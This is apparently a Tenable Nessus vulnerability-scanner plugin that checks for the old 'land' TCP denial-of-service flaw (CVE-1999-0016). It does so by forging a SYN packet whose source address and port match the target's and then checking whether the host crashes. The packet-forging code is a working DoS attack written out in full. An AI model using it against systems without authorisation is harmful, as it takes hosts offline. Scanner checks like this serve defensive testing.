#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10133);
 script_version("$Revision: 1.30 $");
 script_cvs_date("$Date: 2014/05/26 00:51:57 $");

 script_cve_id("CVE-1999-0016");
 script_bugtraq_id(2666);
 script_osvdb_id(14789);

 script_name(english:"TCP/IP SYN Loopback Request Remote DoS (land.c)");
 script_summary(english:"Crashes the remote host using the 'land' attack");

 script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote server crash using the 'land'
attack.

An attacker may use this flaw to shut down this server, thus
preventing your network from working properly.");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0d043d1b");
 script_set_attribute(attribute:"solution", value:"Contact your operating system vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1997/12/17");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);

 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( TARGET_IS_IPV6 ) exit(0);
addr = get_host_ip();
ip = forge_ip_packet(   ip_v : 4,
			ip_hl : 5,
			ip_tos : 0,
			ip_len : 20,
		        ip_id : 0xF1C,
			ip_p : IPPROTO_TCP,
			ip_ttl : 255,
		        ip_off : 0,
			ip_src : addr);
port = get_host_open_port();
if(!port)exit(0);

# According to
#  From: "Seeker of Truth" <seeker_sojourn@hotmail.com>
#  To: bugtraq@securityfocus.com
#  Subject: Fore/Marconi ATM Switch 'land' vulnerability
#  Date: Fri, 14 Jun 2002 23:35:41 +0000
#  Message-ID: <F16103xv3Ho8Xu1njpu00003202@hotmail.com>
# Fore/Marconi ATM Switch FT6.1.1 and FT7.0.1 are vulnerable to a land
# attack against port 23.

tcpip = forge_tcp_packet(    ip	      : ip,
			     th_sport : port,
			     th_dport : port,
			     th_flags : TH_SYN,
		             th_seq   : 0xF1C,
			     th_ack   : 0,
			     th_x2    : 0,
		 	     th_off   : 5,
			     th_win   : 2048,
			     th_urp   : 0);

#
# Ready to go...
#

start_denial();
send_packet(tcpip, pcap_active:FALSE);
sleep(5);
alive = end_denial();
if(!alive){
		set_kb_item(name:"Host/dead", value:TRUE);
		security_warning(0);
		}
